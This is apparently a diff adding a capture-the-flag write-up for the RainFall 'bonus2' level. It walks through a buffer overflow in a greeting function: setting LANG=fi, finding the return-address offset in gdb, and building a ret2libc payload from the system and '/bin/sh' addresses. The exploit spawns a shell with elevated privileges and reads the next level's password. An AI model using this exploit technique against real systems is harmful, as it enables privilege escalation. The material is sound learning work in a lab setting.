@@ -1,0 +1,72 @@
+after looking into the source code we notice that in the "greetuser" function
+he appends the input buffer to a string that is given by a gobal var that is set
+after reading the content of the LANG env var, and the buffer thet is appended
+is the one which is taken as input, which is also a join between the 40 chars
+of argv[1] and 32 of argv[2], we can try to set LANG=fi:
+
+bonus2@RainFall:~$ export LANG=fi
+
+and seek for the offset for the returning address of the function:
+
+(gdb) r $(python -c 'print("A"*40)')  aaaabbbbccccddddeeeeffffgggghhhh
+Starting program: /home/user/bonus2/bonus2 $(python -c 'print("A"*40)')  aaaabbbbccccddddeeeeffffgggghhhh
+Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaabbbbccccddddeeeeffffgggghhhh
+
+Program received signal SIGSEGV, Segmentation fault.
+0x66666565 in ?? ()
+
+0x66666565 -> eeff -> offset = 18
+
+we can try a ret2libc:
+(gdb) info proc map
+process 5027
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
+         0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
+        0xb7e2b000 0xb7e2c000     0x1000        0x0
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0
+        0xb7fda000 0xb7fdd000     0x3000        0x0
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+(gdb) info fun system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xb7e6b060  __libc_system
+0xb7e6b060  system
+0xb7f49550  svcerr_systemerr
+
+
+now we have:
+system:		0xb7e6b060	->	"\x60\xb0\xe6\xb7"
+/bin/sh:	0xb7f8cc58	->	"\x58\xcc\xf8\xb7"
+
+
+(gdb) r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ  $(python -c 'print("B"*18 + "\x60\xb0\xe6\xb7")')
+Starting program: /home/user/bonus2/bonus2 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ  $(python -c 'print("B"*18 + "\x60\xb0\xe6\xb7")')
+Hyvää päivää AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJBBBBBBBBBBBBBBBBBB`
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414100 in ?? ()
+(gdb) x /wx $esp
+0xbffff644:     0x42424242
+
+now we know where to put sh' address
+
+bonus2@RainFall:~$ ./bonus2 $(python -c 'print("AAAA" + "\x58\xcc\xf8\xb7" + "A"*32)')  $(python -c 'print("B"*18 + "\x60\xb0\xe6\xb7")')
+Hyvää päivää AAAAXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`
+$ id
+uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
